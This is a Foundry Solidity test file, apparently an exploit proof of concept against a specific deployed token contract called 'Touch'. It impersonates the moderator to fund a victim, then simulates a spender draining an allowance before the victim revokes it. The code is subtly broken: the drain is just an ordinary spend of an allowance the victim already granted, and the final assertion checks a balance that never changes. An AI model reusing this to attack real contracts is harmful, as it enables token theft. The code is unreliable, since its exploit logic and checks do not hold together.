// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface Touch {
    function moderator() external view returns (address);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    address internal victim;
    address internal spender;
    Touch internal token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create victim and spender addresses
        victim = address(0x123);
        spender = address(0x456);

        // Label for debugging
        vm.label(victim, "Victim");
        vm.label(spender, "Attacker/Spender");

        // Get the Touch token contract
        token = Touch(TARGET);

        // Check who the moderator is (has all tokens)
        address moderator = token.moderator();
        vm.label(moderator, "Moderator");

        // Impersonate moderator to get tokens to victim
        vm.startPrank(moderator);
        token.transfer(victim, 1000 * 10**18); // Transfer some tokens to victim
        vm.stopPrank();

        // Verify victim has tokens
        uint256 victimBalance = token.balanceOf(victim);
        require(victimBalance > 0, "Victim needs tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        // Step 1: Victim approves spender for some amount
        vm.prank(victim);
        token.approve(spender, 500 * 10**18);

        // Verify approval worked
        uint256 allowanceBefore = token.allowance(victim, spender);
        require(allowanceBefore == 500 * 10**18, "Approval failed");

        // Step 2: Victim tries to approve 0 (to revoke) - but we'll front-run
        // We'll simulate the front-run by having spender transferFrom first
        vm.prank(spender);
        token.transferFrom(victim, spender, 500 * 10**18);

        // Step 3: Now execute the approve(0) from victim
        vm.prank(victim);
        token.approve(spender, 0);

        // Verify allowance is now 0
        uint256 allowanceAfter = token.allowance(victim, spender);
        require(allowanceAfter == 0, "Allowance should be 0");

        // Check attacker balance increased
        uint256 attackerBalance = token.balanceOf(spender);
        assertGt(attackerBalance, 0, "Attacker balance should increase");
        uint256 finalBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

